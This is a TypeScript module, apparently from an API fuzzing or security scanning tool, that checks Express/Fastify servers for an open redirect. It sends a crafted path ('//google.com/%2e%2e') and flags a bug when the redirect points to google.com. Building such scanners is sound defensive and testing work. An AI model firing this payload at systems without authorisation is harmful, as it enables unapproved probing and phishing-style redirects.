import ApiFuzzerPocGeneric, { ApiFuzzer } from '../api-fuzzer-poc-generic';
import { AxiosResponse } from 'axios';
import { BotFuzzer } from 'libs/databases/botFuzzer.database';
import { ParsedPacket } from 'libs/databases/parsedPacket.database';

export default class ExpressFastifyOpenRedirect
  extends ApiFuzzerPocGeneric
  implements ApiFuzzer
{
  constructor(botFuzzer: BotFuzzer, packet: ParsedPacket) {
    super(botFuzzer, packet, ExpressFastifyOpenRedirect.name);
  }

  async poc() {
    const opt = await this.getAxiosOptionsFromPacket(this.packet);
    let { url } = opt;
    if (url[url.length - 1] !== '/') url += '/';
    opt.method = 'GET';
    opt.url = url + '/google.com/%2e%2e'; // GET to -> <host>//google.com/%2e%2e
    const response = await this.sendOneRequest(opt);

    if (response && response.status >= 300 && response.status < 400) {
      if (response.headers['location'].includes('//google.com')) {
        this.logger.log('Found bug');
        return 1;
      }
    }
    this.logger.log('Not detected');
    return 0;
  }
}
